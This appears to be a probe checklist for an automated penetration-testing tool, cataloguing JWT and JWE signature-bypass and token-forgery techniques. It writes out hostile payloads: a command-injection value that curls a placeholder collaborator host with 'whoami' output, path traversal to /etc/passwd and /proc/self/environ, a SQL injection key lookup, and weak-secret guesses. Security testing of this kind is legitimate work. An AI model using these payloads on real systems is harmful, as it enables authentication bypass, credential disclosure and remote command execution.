auto_probe_note: JWT attacks require manual token manipulation. Use test_jwt tool or decode_encode + send_http_request for JWT testing. auto_probe probes serve as checklists only.

alg_none.description: JWT algorithm none bypass — strip signature

probes.description: [Manual] Test if server accepts JWT with alg:none (modify header to {"alg":"none"}, remove signature)
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

alg_confusion.description: JWT RS256 to HS256 algorithm confusion

probes.description: [Manual] Change RS256 to HS256, sign with public key as HMAC secret
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

kid_injection.description: JWT kid parameter injection (path traversal / SQLi / null-byte / command). The kid claim is used by the server to look up the verification key, so any path/SQL/cmd injection in kid that resolves to attacker-known content turns into signature forgery.

probes.description: [Manual] kid: ../../etc/passwd — path traversal in key lookup. /etc/passwd content as HMAC secret confirms read AND key forgery.
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

probes.description: [Manual] kid: ../../../proc/self/environ — read process environment as HMAC secret. Pivots from JWT forge to env-var disclosure.
probes.note: Use test_jwt tool. After read, sign with the leaked content as HMAC secret.

probes.description: [Manual] kid: /dev/null — sign with empty string as secret. Some libs read empty bytes from /dev/null and accept HMAC of empty string.
probes.note: Use test_jwt tool. Sign JWT with HMAC-SHA256 secret = '' (empty).

probes.description: [Manual] kid: ../../tmp/known_file — write a known file to /tmp via separate vuln (SSRF, file_upload), then point kid at it. Predictable HMAC secret.
probes.note: Chain prerequisite: write primitive on target host.

probes.description: [Manual] kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup. Server returns attacker-controlled key, allowing forgery.
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

probes.description: [Manual] kid: known_kid\u0000injected — null byte truncation. Some libs trim at null while DB lookup uses full string.
probes.note: Use test_jwt tool.

probes.description: [Manual] kid: $(curl COLLABORATOR/$(whoami)) — command injection in shelled-out key fetch. Replace COLLABORATOR with generate_collaborator_payload().
probes.note: Rare but devastating. Confirm via Collaborator DNS hit.

jku_injection.description: JWT jku/x5u header injection — attacker-controlled key URL

probes.description: [Manual] jku: https://{{callback}}/jwks.json — SSRF via key URL
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

probes.description: [Manual] Try common JWT secrets: secret, password, 123456, changeme, key
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

embedded_jwk.description: JWT embedded JWK attack — attacker embeds own public key in JWT header

probes.description: [Manual] JWT with jwk header containing attacker-generated RSA public key — server may verify with the embedded key instead of server key
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

variables.note: Generate RSA key pair, sign JWT with private key, embed public key in jwk header

x5c_injection.description: JWT x5c header injection — embed self-signed certificate chain

probes.description: [Manual] JWT with x5c header containing attacker's self-signed certificate — server may use embedded cert for verification
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

variables.note: Create self-signed cert, sign JWT with corresponding private key, set x5c to cert chain

claim_manipulation.description: JWT claim manipulation — modify role, sub, or admin claims to escalate privileges

probes.description: [Manual] Change role claim from 'user' to 'admin' — re-sign or use with alg:none
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

probes.description: [Manual] Change sub claim from 'user1' to 'admin' — IDOR via JWT subject manipulation
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

expired_token.description: Expired JWT acceptance — server does not validate exp claim

probes.description: [Manual] Send JWT with exp set in the past (e.g., epoch 1) — server should reject but may not validate expiry
probes.note: JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.

kid_path_traversal.description: kid header path traversal — point at a file with predictable content (e.g., /dev/null = empty key, /proc/self/environ = process env), then sign HMAC with that content. Distinct from kid_injection in that it lists OS-specific gadget paths.

probes.description: [Manual] kid: /dev/null — empty file = empty HMAC key; sign with empty string
probes.note: Manual.

probes.description: [Manual] kid: file:///dev/null — protocol smuggling variant
probes.note: Manual.

probes.description: [Manual] kid: ../../../../../proc/self/cmdline — read self command-line as key material
probes.note: Manual.

probes.description: [Manual] Windows: kid: ..\..\..\..\windows\win.ini — IIS variant
probes.note: Manual.

jwe_direct.description: JWE direct-key encryption with attacker-known static key. If the server uses a hardcoded JWE direct-encryption key (alg=dir, enc=A256GCM) and that key is in source code or a side-channel, the attacker forges arbitrary tokens.

probes.description: [Manual] Forge JWE with alg=dir + enc=A256GCM using leaked SECRET_KEY as the direct CEK; arbitrary claims if the key is reused
probes.note: Requires the server's static key leaked elsewhere (env var, repo, config endpoint).

jwe_rsa_oaep_downgrade.description: JWE RSA-OAEP → RSA1_5 / dir downgrade. If the server accepts multiple alg values, swap to a weaker one (RSA1_5 is vulnerable to Bleichenbacher; dir requires no signature).

probes.description: [Manual] Change JWE header alg from RSA-OAEP-256 to RSA1_5; if accepted, Bleichenbacher padding oracle applies
probes.note: Manual; requires JWE-shaped tokens.

probes.description: [Manual] Change alg from RSA-OAEP to dir + supply attacker-controlled CEK
probes.note: Manual.

jwe_zip_oracle.description: JWE compression (zip=DEF) oracle. When a JWE uses DEFLATE before encryption, attacker-supplied plaintext content ratios can leak via response-time/length differences — observe whether known-plaintext compression ratios match.

probes.description: [Manual] Forge JWE with zip=DEF and a payload containing a known string + a guessed secret prefix; compare response timings to detect compression hits
probes.note: Manual; oracle attack — requires N tokens to converge.

jku_x5u_attacker.description: jku / x5u header pointing at attacker-controlled URL. Server fetches the JWK Set / x509 cert from the attacker URL and uses it to verify the token, allowing arbitrary forgery.

probes.description: [Manual] jku: https://COLLABORATOR/jwks.json — host a JWKS with attacker public key; forge token signed with matching private key
probes.note: OOB confirmation via Collaborator hit.

probes.description: [Manual] x5u: https://COLLABORATOR/cert.pem — same attack via x5u (x509 cert URL)
probes.note: OOB confirmation via Collaborator hit.

embedded_jwk_self_sign.description: Self-signed JWT via embedded jwk header (attacker-generated key pair). The original embedded_jwk context covers detection; this one focuses on the full self-sign forgery flow.

probes.description: [Manual] Embed attacker-generated jwk in JWT header, sign with matching private key — bypasses the entire trust chain
probes.note: Manual.

lsr_revoke_race.description: JWT auth-bypass with Last-Stored-Result race. Concurrent revoke + use windows: token validates after revoke if validator caches.

probes.description: Send 2 concurrent requests — one POST /revoke-token, one GET /protected with same token. status_2 = 200 after status_1 ack = bypass.

cty_content_type_confusion.description: JWT cty (Content Type) header forces JWS payload to be re-parsed as XML/HTML — bypass JWS signature verification.

probes.description: Forge JWT with header cty=text/xml — body parsed as XML, attacker controls XML entities

jwe_wrapped_plain_inner_bypass_2026.description: pac4j-jwt JWE-wrapped PlainJWT auth bypass (CVE-2026-29000 class) — server accepts JWE outer envelope and trusts inner JOSE header alg:none PlainJWT without re-verifying. Forge token with arbitrary 'sub'.

probes.description: [Manual] Build JWE(alg=dir, enc=A128CBC-HS256) wrapping PlainJWT({alg:none}) with attacker sub claim
probes.note: Requires manual crafting — use python-jose / pyjwt + decode_encode to construct then send via curl_request

pyjwt_algorithm_confusion_2026.description: PyJWT algorithm-confusion variant (CVE-2026-48526 class) — server's PyJWT decode accepts HS256 token signed with the asymmetric PUBLIC key when caller passes the key as a string rather than KeyObject. Classic alg-confusion echo.

probes.description: [Manual] Re-sign JWT as HS256 using the public RSA key (or ES256→HS256 if ES key known)
probes.note: Requires public key (often /.well-known/jwks.json) and decode_encode tool

unknown_alg_signature_skip_2026.description: HarbourJwt 'unknown alg' bypass (CVE-2026-23993 class) — server treats unrecognised alg value as 'skip signature verification' and accepts arbitrary payload. Detect via random-alg token acceptance.

probes.description: [Manual] Forge JWT with alg='foo' or alg='NONE' (case variation) — server should reject; if 200, signature skipped
